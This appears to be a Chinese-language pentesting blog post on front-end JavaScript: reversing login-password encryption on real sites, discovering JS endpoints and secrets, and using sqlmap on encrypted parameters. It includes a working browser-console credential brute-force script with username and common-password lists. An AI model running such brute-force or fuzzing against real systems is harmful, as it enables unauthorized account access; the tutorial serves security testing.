
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title>渗透过程中的JS | pyroxenite</title>
<meta name="description" content="温故而知新">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://pyroxenites.github.io">
        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
      </a>
      <a href="https://pyroxenites.github.io">
        <h1 class="site-title">pyroxenite</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            首页
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            归档
          </a>
        
      
        
          <a href="/tags" class="menu purple-link">
            标签
          </a>
        
      
        
          <a href="/post/about" class="menu purple-link">
            关于
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">
        <div class="post-detail">
          
          <h2 class="post-title">渗透过程中的JS</h2>
          <div class="post-info post-detail-info">
            <span><i class="icon-calendar-outline"></i> 2022-06-08</span>
            
              <span>
                <i class="icon-pricetags-outline"></i>
                
                  <a href="https://pyroxenites.github.io/tag/ss0d3nxC-/">
                    渗透测试
                    
                  </a>
                
              </span>
            
          </div>
          <div class="post-content" v-pre>
            <blockquote>
<p>渗透很多进去点都在登录处<br>
随着安全的不断推进,前端加密这些选项应对不得不学习</p>
</blockquote>
<h1 id="要点">要点</h1>
<ol>
<li>JS信息收集:URL/API/密码/业务逻辑</li>
<li>JS加密 : RAS/签名校验</li>
<li>JS混淆/反混淆 字符串混淆/eval混淆/函数数组对象混淆/OB混淆</li>
</ol>
<h1 id="chrome-debug一些技巧">chrome debug一些技巧</h1>
<h2 id="搜索功能ctrlshiftfctrlf">搜索功能(ctrl+shift+f)(ctrl+f)</h2>
<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1648965711007-8e1dff99-58b1-4d69-8fa4-dc8799cd88f5.png" alt="image.png" loading="lazy"></figure>
<h2 id="搜索文件ctrlo">搜索文件(ctrl+o)</h2>
<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1648966858441-7e3533bd-cda4-4bd9-a041-caa55e8d0afb.png" alt="image.png" loading="lazy"></figure>
<h2 id="显示文件成员函数ctrlshifto">显示文件成员函数(ctrl+shift+o)</h2>
<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1648967866679-6f8fff51-ad5d-44fc-9f23-a9822d13c53f.png" alt="image.png" loading="lazy"></figure>
<h2 id="编写js代码">编写js代码</h2>
<p><img src="https://pyroxenites.github.io/post-images/1648967965805-027e83a3-949a-42c1-8ccf-e271ab769e97.png" alt="image.png" loading="lazy"><br>
格式化<br>
<img src="https://pyroxenites.github.io/post-images/1648966896899-d6e3f4b3-d637-43b6-bf3c-36a71c7ed3f9.png" alt="image.png" loading="lazy"></p>
<h2 id="断点调试">断点调试</h2>
<p>在行数点击一下可以下一个断点<br>
<img src="https://pyroxenites.github.io/post-images/1648967390338-5ddd8f93-7721-47d9-8840-08bbd444c006.png" alt="image.png" loading="lazy"><br>
给 DOM 元素设置断点</p>
<blockquote>
<p>设置好断点后，当 DOM 元素要被修改时，代码就会在自动停留在修改处。</p>
</blockquote>
<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1648967688396-88b1b8ab-bff8-46cf-9339-26c27813497f.png" alt="image.png" loading="lazy"></figure>
<blockquote>
<ol>
<li>（等号）pause script execution<br>
–&gt;暂停脚本执行 -&gt; 常用在一个方法调用多个js文件时，涉及到的js代码比较长，则会使用到这个按钮(相当于从一个断点调到下一个断点)</li>
<li>（半弧箭头）step 快捷键：F9<br>
–&gt;单步执行 注意：遇到子函数会进去继续单步执行-&gt; 每点击它一次，js语句就会往后执行一句</li>
<li>（下箭头）step into 快捷键：F11 全称：step into next function call<br>
–&gt;单步执行，遇到子函数就进去继续单步执行</li>
<li>（上箭头）step over 快捷键：F10 全称：step over next function call<br>
–&gt;单步执行，遇到子函数并不进去，将子函数执行完并将其作为一个单步</li>
<li>（右箭头）step out 快捷键：Shift + F11 全称：step out of current function<br>
–&gt;直接跳出当前的函数，返回父级函数</li>
<li>（右粗箭头，点击一下多一个斜线，再次点击就取消了）deactivate breakpoints or activate breakpoints<br>
–&gt;禁用断点/启用断点</li>
<li>（圆形等号）pause on execution<br>
–&gt;暂停执行</li>
</ol>
</blockquote>
<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1648968138565-272d51ba-25c7-49b5-a825-a134cf2bbccb.png" alt="image.png" loading="lazy"></figure>
<p>XHR(XMLHttpRequest)断点</p>
<blockquote>
<p>通过监听 xhr 的断点，可以轻而易举的找到事件的触发点和调用堆栈</p>
</blockquote>
<p>通过数据包发现加密和请求路径<br>
<img src="https://pyroxenites.github.io/post-images/1648977719037-740a68a0-ffcf-45c9-8205-cb35f81a2702.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648977729723-1830272d-e6da-402b-bf77-e15b06d2c5ff.png" alt="image.png" loading="lazy"></p>
<blockquote>
<p>他会拦截包含这个路径的时候的包</p>
</blockquote>
<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1648977793825-1faed094-9ee5-44e8-82c3-443536f2bd16.png" alt="image.png" loading="lazy"></figure>
<blockquote>
<p>在发包的时候停止下来</p>
</blockquote>
<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1648977832611-68e56aa6-d6fa-4606-b733-7d9412bd2798.png" alt="image.png" loading="lazy"></figure>
<blockquote>
<p>然后通过堆栈信息找到加密的参数</p>
</blockquote>
<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1648978166957-845099e3-dcb6-4164-98f3-c02feea55d09.png" alt="image.png" loading="lazy"></figure>
<h2 id="监视器">监视器</h2>
<p>监控执行当前断点所在作用域任何表达式的执行结果<br>
<img src="https://pyroxenites.github.io/post-images/1648967084818-b0586404-85aa-46f2-a6d2-93bb704b5c11.png" alt="image.png" loading="lazy"></p>
<h2 id=""></h2>
<h2 id="调用栈">调用栈</h2>
<p>表示这个函数的调用堆栈，也就是 setState 是被哪个上层函数调用的，上层函数又是谁调用的...<br>
<img src="https://pyroxenites.github.io/post-images/1648967315570-4ea6a1f4-2b76-484c-9f56-16983d97a282.png" alt="image.png" loading="lazy"></p>
<h2 id="流量清楚">流量清楚</h2>
<p><img src="https://pyroxenites.github.io/post-images/1648980560297-2c196e4b-03d8-4cf4-8d5c-40314ce37b60.png" alt="image.png" loading="lazy"><br>
排除干扰流量</p>
<h1 id="汽车之家演示">汽车之家演示</h1>
<blockquote>
<p><a href="https://account.autohome.com.cn/">https://account.autohome.com.cn/</a><br>
跟方便理解</p>
</blockquote>
<p><img src="https://pyroxenites.github.io/post-images/1648964217000-f11a6b62-0702-442f-abef-b492e7fa9d06.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648964272947-e7182d00-c912-47e0-b56b-b39eeca8ed94.png" alt="image.png" loading="lazy"><br>
发现密码被加密了</p>
<p>我们全局搜索一下pwd关键字,发现应是经过md5加密过得<br>
<img src="https://pyroxenites.github.io/post-images/1648964373872-67704b34-6325-4921-8d6e-4f6f8b480c99.png" alt="image.png" loading="lazy"></p>
<p>打上断点准备进行调试</p>
<p><img src="https://pyroxenites.github.io/post-images/1648964447473-7c2d4caa-442b-4393-b5ff-29b4e713d690.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648964490699-c4561222-9a39-4422-9522-5c2952f7c02e.png" alt="image.png" loading="lazy"></p>
<p>看到自己的明文密码<br>
<img src="https://pyroxenites.github.io/post-images/1648964534777-d701303f-eefb-498b-a777-b0fbada2a7a4.png" alt="image.png" loading="lazy"><br>
在控制台运行一下<br>
<img src="https://pyroxenites.github.io/post-images/1648965450459-1d2ef007-0d11-4e76-9d00-bddfa429625b.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648965460884-fb405993-1bcd-4893-9062-a425fa95296d.png" alt="image.png" loading="lazy"><br>
至此找到加密的函数<br>
随后我们进入hex_md5,这个加密密码的函数</p>
<blockquote>
<p><a href="https://jsfiddle.net/">https://jsfiddle.net/</a><br>
<a href="http://jsrun.net/new">http://jsrun.net/new</a></p>
</blockquote>
<p>把hex_md5复制到运行js的地方,不断找到没有被定义的函数,然后复制过来<br>
<img src="https://pyroxenites.github.io/post-images/1648965040245-61728fb5-7474-436b-a8af-1bb725a60d5f.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648965058370-265af940-c4a1-4faf-bd0f-c2e2469f3851.png" alt="image.png" loading="lazy"></p>
<blockquote>
<p>如果发现都在一个JS文件中,猜测这个JS文件是加密文件可以整个复制<br>
最终只把加密逻辑部分弄过来就好</p>
</blockquote>
<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1648968595691-3d9a800d-5603-4505-b834-48a031d30216.png" alt="image.png" loading="lazy"></figure>
<h1 id="寻找js接口">寻找JS接口</h1>
<p>我们可以ctrl+shift+F进行全局搜索path等关键字</p>
<p>当发现JS压缩混乱的时候,可以点击下方花括号,就能格式化JS代码<br>
或者也可以使用Quick source viewer(chrome插件)<br>
<img src="https://pyroxenites.github.io/post-images/1648947200201-b024012f-f63e-4c6c-9a24-2269f72666cc.png" alt="image.png" loading="lazy"></p>
<blockquote>
<p>JSfinder(py/油猴) -----JSFinderAAA/leakfinder/JSINFO-SCAN/JSFinderPlus/Tampermonkey-js  (改动版)<br>
findsomething(chrome插件)<br>
linkfinder(py)<br>
gau<br>
burpjsLinkFinder/JSFinderForBurp(burp插件)</p>
</blockquote>
<pre><code class="language-go">gau paypalobjects.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u  &gt;&gt; paypalJS.txt
gau paypal.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u  &gt;&gt; paypalJS.txt

</code></pre>
<h2 id="js-fuzz">JS FUZZ</h2>
<p>上方的方法基本属于基于爬虫的操作,其实也可以通过爆破来确定网站具有的JS文件<br>
毕竟fuzz出奇迹</p>
<blockquote>
<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a><br>
<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p>
</blockquote>
<p>我们可以通过观察来寻找js所要爆破的路径</p>
<ol>
<li>特性</li>
</ol>
<blockquote>
<p>输入https://x.x.x.x/js,当目录存在的时候会自动在后面添加上/,例如浏览器访问/js,将会变成/js/来访问<br>
可以根据此特性进行爆破<br>
存在403,不存在404</p>
</blockquote>
<ol start="2">
<li>目录爆破工具</li>
</ol>
<blockquote>
<p>也是利用扫描工具探测存在的目录<br>
可以进行递归爆破,比如探测存在routes,再接下存在admin目录<br>
原理和上面差不多,比如dirsearch就会提醒</p>
</blockquote>
<ol start="3">
<li>已知存在的目录</li>
</ol>
<blockquote>
<p>比如https://x.x.x.x/adminjs/login.js,我们便可尝试在adminjs下进行爆破</p>
</blockquote>
<pre><code class="language-c">.\ffuf -mc 200 -u http://218.193.160.93:3000/js/FUZZ -w .\js.txt

##无论输入什么都返回相同内容,可以用-fs排除掉指定的体积大小来进行绕过
.\ffuf -mc 200 -u http://218.193.160.93:3000/js/FUZZ -w .\js.txt -fs 625
</code></pre>
<h2 id="burp-js获取">burp js获取</h2>
<p><img src="https://pyroxenites.github.io/post-images/1648979038883-9730c272-ec50-46be-b561-674412e66295.png" alt="image.png" loading="lazy"><br>
保存,然后利用linkfinder获取<br>
<img src="https://pyroxenites.github.io/post-images/1648979327366-f8ea3e5d-52f5-4759-b4f0-da58816e8d0b.png" alt="image.png" loading="lazy"></p>
<h2 id="js关键字提取">JS关键字提取</h2>
<blockquote>
<p><a href="https://github.com/m4ll0k/SecretFinder">https://github.com/m4ll0k/SecretFinder</a><br>
<a href="https://github.com/m4ll0k/BBTz/blob/master/antiburl.py">https://github.com/m4ll0k/BBTz/blob/master/antiburl.py</a><br>
<a href="https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/collector.py">https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/collector.py</a><br>
<a href="https://github.com/m4ll0k/BBTz/blob/master/getjswords.py">https://github.com/m4ll0k/BBTz/blob/master/getjswords.py</a><br>
js存活<br>
github.com/hakluke/hakcheckurl</p>
</blockquote>
<pre><code class="language-go">url: , POST , api , GET , setRequestHeader , send( 
(注意:只有⼀个 (，因为它在发出 Ajax 请求时使⽤！) 
 .headers , onreadystatechange , var {xyz} = 
getParameter() , parameter , .theirdomain.com, apiKey

postMessage , messageListenger , .innerHTML , document.write( 
document.cookie , location.href , redirectUrl , window.hash 
</code></pre>
<pre><code class="language-go">cat js_files_url_list.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t
Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
</code></pre>
<h2 id="敏感信息">敏感信息</h2>
<p>例如密码、API 密钥等硬编码。从 JS 代码中找到 这些信息。<br>
AWS 密钥正则表达式可能如下所示：</p>
<pre><code class="language-go">(?i)aws(.{0,20})?(?-i)['\”][0–9a-zA-Z\/+]{40}['\”]
</code></pre>
<p><strong>这里可以使用Burp的HaE插件</strong></p>
<p>更多可以参考:<br>
https://github.com/l4yton/RegHex<br>
https://github.com/securing/DumpsterDiver<br>
https://github.com/auth0/repo-supervisor<br>
https://github.com/trufflesecurity/truffleHog<br>
https://hackerone.com/reports/991718<br>
https://hackerone.com/reports/983331<br>
https://hackerone.com/reports/638635</p>
<h2 id="js代码美好">JS代码美好</h2>
<p><a href="https://beautifier.io/">https://beautifier.io/</a></p>
<h2 id="js反混淆">JS反混淆</h2>
<p>https://lelinhtinh.github.io/de4js/<br>
大多数类型的混淆都可以解决;</p>
<h2 id="jsmap文件">JS.map文件</h2>
<p>是以js.map为后缀的⽂件,这是jQuery中的⼀个新功能，⽀持Source Map, 非常多Webpack打包的站点都会存在js.map⽂件.通过还原前端代码找到API,间接性获取未授权访问漏洞, 简单说，Source map就是⼀个信息文件，里面储存着位置信息。转换后的代码的每⼀个位置，所对应的 转换前的位置。 有了它，出错的时候，出错⼯具将直接显示原始代码，而不是转换后的代码,这给开发者带来了方便。<br>
相关的处理⼯具有:(可以使用它们将代码还原)</p>
<p>https://www.npmjs.com/package/restore-source-tree<br>
https://github.com/paazmaya/shuji<br>
https://www.npmjs.com/package/reverse-sourcemap<br>
https://github.com/rarecoil/unwebpack-sourcemap</p>
<p>chrome插件<br>
<a href="https://github.com/SunHuawei/SourceDetector">https://github.com/SunHuawei/SourceDetector</a></p>
<h2 id="开发人员注释">开发人员注释</h2>
<p>推荐一个chrome插件ScanAnnotation<br>
<img src="https://pyroxenites.github.io/post-images/1648988336573-0ae6e2ec-4037-41f1-9d5c-789fedbcaede.png" alt="image.png" loading="lazy"></p>
<h1 id="burp-js爆破">burp js爆破</h1>
<blockquote>
<p>还是以演示的汽车之家为例</p>
</blockquote>
<p>在console中批量将密码加密<br>
<img src="https://pyroxenites.github.io/post-images/1648969255832-14718ee7-9a30-4343-9937-d631d8a9fb20.png" alt="image.png" loading="lazy"><br>
将其全选并复制出来<br>
<img src="https://pyroxenites.github.io/post-images/1648969312207-461f597c-f294-42ee-a4ac-4e8e05b6bb86.png" alt="image.png" loading="lazy"></p>
<p>或者用其他的代码方式进行保存</p>
<blockquote>
<p><a href="https://github.com/lz520520/encrypt-js">https://github.com/lz520520/encrypt-js</a></p>
</blockquote>
<p><img src="https://pyroxenites.github.io/post-images/1648970303204-d6f3d6bf-8da4-4c6f-9db1-689f7f96dd3b.png" alt="image.png" loading="lazy"><br>
将密码写入js中<br>
<img src="https://pyroxenites.github.io/post-images/1648970316436-b0769208-3686-466f-9b8c-3f73245dcd3d.png" alt="image.png" loading="lazy"></p>
<p><img src="https://pyroxenites.github.io/post-images/1648970339460-07abd9a4-277c-475b-a36f-d1cb4743fc22.png" alt="image.png" loading="lazy"><br>
放到浏览器中运行</p>
<p>保存出来,进行正则提取<br>
<img src="https://pyroxenites.github.io/post-images/1648970438603-5bbdf783-cb01-43be-a9a7-22b3d138a365.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648970450867-bc413307-4ac9-4f7d-8027-8adcf4b2ebc2.png" alt="image.png" loading="lazy"><br>
便可用此文件去进行爆破,如果成功可对比明文得到答案</p>
<blockquote>
<p>这样的好处是,我们在浏览器中进行加密,速度快而且更加方便,不需要所有加密代码都要扣下来</p>
</blockquote>
<h2 id="参数获取">参数获取</h2>
<blockquote>
<p><a href="https://github.com/Elsfa7-110/GoldenNuggets-1">https://github.com/Elsfa7-110/GoldenNuggets-1</a><br>
<a href="https://github.com/gh0stkey/CaA">https://github.com/gh0stkey/CaA</a></p>
</blockquote>
<h1 id="burp-加密sql注入">burp 加密sql注入</h1>
<blockquote>
<p><a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a></p>
</blockquote>
<p>如果我们想到加密的参数的网站进行sqlmap的使用因为怎么办</p>
<blockquote>
<ol>
<li>tamper脚本中使用js2py/execjs这些库进行编写利用</li>
<li>burp jsEncrypter插件配合使用</li>
<li>mitmproxy等配置代理给sqlmap，并自动化将参数加密转发到服务器，让sqlmap正常工作</li>
</ol>
</blockquote>
<p>这时候我们就需要全部的加密逻辑</p>
<p><img src="https://pyroxenites.github.io/post-images/1648972604770-a8a2c87b-a266-48f1-88c2-dc0f10347cce.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648972967564-c9940ae5-54bc-4468-855f-a4ffd712cf49.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648973074226-12da4feb-4b90-4bc7-957a-363de62e2a87.png" alt="image.png" loading="lazy"><br>
<img src="https://pyroxenites.github.io/post-images/1648973124465-d1d3c29c-06b7-4560-a44b-a59b03af55f9.png" alt="image.png" loading="lazy"><br>
成功将明文加密成功</p>
<h1 id="浏览器js爆破">浏览器js爆破</h1>
<h2 id="优势">优势</h2>
<ol>
<li>js 加密，再通过js 解密省去了分析加密过程</li>
<li>异步速度很快</li>
<li>无需部署其它环境，一个浏览器就够了</li>
</ol>
<blockquote>
<p>如网站没引用jquery，须引用外部jquery</p>
</blockquote>
<h2 id="示例代码">示例代码</h2>
<pre><code class="language-javascript">// http://192.168.1.9:8000/home/Account/LogOn 
// 定义用户名部分
var uids = [&quot;admin&quot;,&quot;2311&quot;,&quot;7245&quot;,&quot;2627&quot;,&quot;7243&quot;,&quot;6100&quot;,&quot;2970&quot;,&quot;6939&quot;,&quot;6549&quot;,&quot;6696&quot;,&quot;8006&quot;,&quot;6733&quot;,&quot;8224&quot;,&quot;8007&quot;,&quot;6132&quot;]
// var uids=[&quot;admin&quot;]
//定义密码列表
var pass = [&quot;!QAZ6yhn&quot;,&quot;000000&quot;,&quot;000000000&quot;,&quot;0000000000&quot;,&quot;0000000000000000&quot;,&quot;0123456789&quot;,&quot;110120119&quot;,&quot;111111&quot;,&quot;111111111&quot;,&quot;1111111111&quot;,&quot;1111111111111111&quot;,&quot;123.mima&quot;,&quot;123123&quot;,&quot;123123123&quot;,&quot;1233211234567&quot;,&quot;1234.com&quot;,&quot;1234554321&quot;,&quot;123456&quot;,&quot;123456.&quot;,&quot;123456..&quot;,&quot;123456789&quot;,&quot;123456789.&quot;,&quot;123456789..&quot;,&quot;1234567890&quot;,&quot;12345678900&quot;,&quot;1234567891&quot;,&quot;12345678910&quot;,&quot;1234567891234567&quot;,&quot;1234567899&quot;,&quot;123456789a&quot;,&quot;123456789abc&quot;,&quot;123456789q&quot;,&quot;123456789qq&quot;,&quot;123456a&quot;,&quot;123456aa&quot;,&quot;123456abc&quot;,&quot;123456asd&quot;,&quot;123456q&quot;,&quot;123456qq&quot;,&quot;123698745&quot;,&quot;123abc&quot;,&quot;1314520520&quot;,&quot;135792468&quot;,&quot;1357924680&quot;,&quot;147258369&quot;,&quot;1472583690&quot;,&quot;1qaz!QAZ2wsx@WSX&quot;,&quot;1qaz#EDC5tgb&quot;,&quot;1qaz2wsx!QAZ@WSX&quot;,&quot;1qaz@WSX&quot;,&quot;1qaz@WSX3edc&quot;,&quot;1qaz@wsx&quot;,&quot;2wsx#EDC&quot;,&quot;3edc$RFV&quot;,&quot;5201314&quot;,&quot;5201314520&quot;,&quot;52013145201314&quot;,&quot;5841314520&quot;,&quot;5tgb^YHN&quot;,&quot;6yhn&amp;UJM&quot;,&quot;741852963&quot;,&quot;7708801314520&quot;,&quot;789456123&quot;,&quot;7894561230&quot;,&quot;987654321&quot;,&quot;9876543210&quot;,&quot;AAA111...&quot;,&quot;Aa111111&quot;,&quot;Abc@1234&quot;,&quot;Abcd1234&quot;,&quot;Hello01!&quot;,&quot;Hema1111&quot;,&quot;MIMA.123&quot;,&quot;Qwe123!@#&quot;,&quot;Welcome123&quot;,&quot;Welcome1234&quot;,&quot;a123123&quot;,&quot;a123456&quot;,&quot;a12345678&quot;,&quot;a123456789&quot;,&quot;a5201314&quot;,&quot;aa123456&quot;,&quot;aa123456789&quot;,&quot;aaa123456&quot;,&quot;abc123&quot;,&quot;abc123456&quot;,&quot;abc123456789&quot;,&quot;abcd123&quot;,&quot;abcd1234&quot;,&quot;abcd123456&quot;,&quot;aini1314&quot;,&quot;as123456&quot;,&quot;asd123&quot;,&quot;asd123456&quot;,&quot;asdASD123!@#&quot;,&quot;asdfghjkl&quot;,&quot;caonima&quot;,&quot;fir2k7st&quot;,&quot;mima..123&quot;,&quot;mima.123&quot;,&quot;mima.1234&quot;,&quot;mima.321&quot;,&quot;mima.456&quot;,&quot;mima123.&quot;,&quot;nopass.1&quot;,&quot;nopass.2&quot;,&quot;password1!&quot;,&quot;q123456&quot;,&quot;q123456789&quot;,&quot;qaz123456&quot;,&quot;qazwsxedc&quot;,&quot;qazxsw.123&quot;,&quot;qq123456&quot;,&quot;qq123456789&quot;,&quot;qq5201314&quot;,&quot;qwe123&quot;,&quot;qwe123456&quot;,&quot;qwe567,.&quot;,&quot;qwerty&quot;,&quot;qwertyuiop&quot;,&quot;w123456&quot;,&quot;w123456789&quot;,&quot;wang123456&quot;,&quot;woaini&quot;,&quot;woaini123&quot;,&quot;woaini1314&quot;,&quot;woaini1314520&quot;,&quot;woaini520&quot;,&quot;woaini521&quot;,&quot;www123456&quot;,&quot;z123456&quot;,&quot;z123456789&quot;,&quot;zxc123&quot;,&quot;zxc123.0&quot;,&quot;zxc123456&quot;,&quot;zxcvbnm&quot;,&quot;zxcvbnm123&quot;]

var count = uids.length * pass.length

console.info(&quot;[i]INFO: 一共需要请求:&quot;+count+&quot;次\n&quot;)
//定义登录接口
var url = &quot;http://192.168.1.9:8000/home/account/LogOn&quot;

//请求主体,及表单部分
function p(url,uid,pass){
  // js密码加密部分
  enpass = do_encrypt_slim(getmd5str(pass)) 
  $.ajax({
    url : url,
    type : &quot;POST&quot;,
    async : false,
    data : {  
      usercode:uid,
      password:enpass,
      phonecheckword:null
    },
    success : function(data){
      if(data.flag != false){
        console.log(&quot;%c[+] login successful!\n&quot;+&quot;Loginid:&quot;+uid+&quot;\tpassword:&quot;+pass+&quot;\tusername:\t&quot;+data.username+&quot;\n&quot;,&quot;color: green&quot;)
      }else{
        console.warn(&quot;[-] Login failed !\t当前尝试用户:&quot;+ uid +&quot;\t信息:&quot;+data.msg+&quot;\n&quot;)
      }
    },
    timeout: 1000 //防止卡死
  });
}

for (uint =0; uint&lt;=uids.length-1;uint++){
  for (i = 0; i&lt;=pass.length-1;i++){
    p(url,uids[uint],pass[i]);
    
  }
}
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1647165612007-26ca35fb-7b1f-4070-8c62-90eb9f445484.png" alt="image.png" loading="lazy"></figure>
<h1 id="js敏感函数">JS敏感函数</h1>
<h3 id="将字符串当做代码去执行的三个函数">将字符串当做代码去执行的三个函数</h3>
<pre><code class="language-go">eval(&quot;alert(1)&quot;)
setTimeout(&quot;alert(1)&quot;,1000)

Function(&quot;alert(1)&quot;)()
</code></pre>
<ol start="2">
<li>innerHTML 函数<br>
如果没有进行适当的处理，可能出现XSS,即使经过了处理，试着看能不能绕过;<br>
React中就有⼀个和innerHTML差不多的函数叫做dangerouslytSetInnerHTML，这个函数也是重<br>
点关注对象;<br>
还有Angular中的bypassSecurityTrustX，还有熟悉的eval函数;</li>
<li>Postmessage 函数<br>
最好先去看看它的官方文档: https://developer.mozilla.org/enUS/docs/Web/API/Window/postMessage ,<br>
⼀旦了解了与 postMessage 相关的可能的安全问题，就可以在 JavaScript ⽂件中查找实现。在消息发<br>
送⽅，寻找window.postMessage并在接收⽅寻找监听器window.addEventListener。<br>
相关资料可以查看下⾯两个链接:<br>
<a href="https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/">https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/</a><br>
https://medium.com/techiepedia/what-are-sop-cors-and-ways-to-exploit-it62a5e02100dc</li>
<li>String.prototype.search() .<br>
⼀些开发⼈员使⽤它来查找⼀个字符串在另⼀个字符串中的出现。然⽽， ”.” 在此函数中被视为通配<br>
符。<br>
具体可以看下⾯这个报告:<br>
<a href="https://hackerone.com/reports/129873">https://hackerone.com/reports/129873</a></li>
<li>location 相关的⼏个函数<br>
location: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-099935">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-099935</a><br>
location.href: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-062771">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-062771</a><br>
location.pathname: <a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-013059">http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2012-013059</a></li>
<li>document.cookie<br>
这个函数也⽐较重要,具体不展开了，可以去看看filedescriptor 的⼀篇报告:<br>
<a href="https://hackerone.com/reports/422043">https://hackerone.com/reports/422043</a></li>
<li>window.name<br>
可以具体看看下⾯链接:<br>
<a href="https://xz.aliyun.com/t/6019">https://xz.aliyun.com/t/6019</a><br>
https://blog.appsecco.com/automating-discovery-and-exploiting-dom-client-xss-vulnerabilitiesusing-sboxr-part-3-2ea910dfb429</li>
<li>localStorage 以及 sessionStorage<br>
<a href="https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b">https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b</a><br>
<a href="https://hackerone.com/reports/297968">https://hackerone.com/reports/297968</a><br>
从JS 代码中查找过时的依赖项。⼀个字，⼲就完了，可以直接使⽤ retire.js 来扫描漏洞。可以在以下链<br>
接中找到该项⽬：<br>
<a href="https://retirejs.github.io/retire.js/">https://retirejs.github.io/retire.js/</a></li>
</ol>
<h1 id="js中的可注册域名">JS中的可注册域名</h1>
<p>如果开发者把本来的域名googleapis.com写成了gooogleapis.com,而gooogleapis.com刚好可以被注册,便可以在网页中引入你可控的JS</p>
<h1 id="中国电信演示">中国电信演示</h1>
<blockquote>
<p>找到第一次加密的密码的位置</p>
</blockquote>
<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1648981848147-62ca53d9-b627-4785-b756-6496923e4de6.png" alt="image.png" loading="lazy"></figure>
<blockquote>
<p>发现在同意协议的时候<br>
密码已经被加密发送了</p>
</blockquote>
<p><img src="https://pyroxenites.github.io/post-images/1648981966729-909483c0-aafc-40fb-a35c-fd920e30c130.png" alt="image.png" loading="lazy"><br>
搜索一下路径关键字<br>
<img src="https://pyroxenites.github.io/post-images/1648982005823-d2bb291f-ff99-41f5-b292-e0f0447a205b.png" alt="image.png" loading="lazy"></p>
<p><img src="https://pyroxenites.github.io/post-images/1648982170078-3b8f894b-cdcc-4264-9073-223703b70566.png" alt="image.png" loading="lazy"><br>
发现到此的时候已经进行加密了<br>
<img src="https://pyroxenites.github.io/post-images/1648982377214-161426b6-6293-4c3a-a273-df8ddfed6d18.png" alt="image.png" loading="lazy"><br>
查看调用ValidatePwd的地方,觉得val是密码,所以监控一下val的值<br>
发现确实是输入的密码123456<br>
<img src="https://pyroxenites.github.io/post-images/1648982965540-c3eb4f33-9143-4ae0-b6af-0f6d89643355.png" alt="image.png" loading="lazy"><br>
点进去发现加密函数,已经发现是AES加密了<br>
所以我们要知道加密模式和填充方式以及key,编码,iv向量</p>
<p>这里key值是c,iv向量是d	<br>
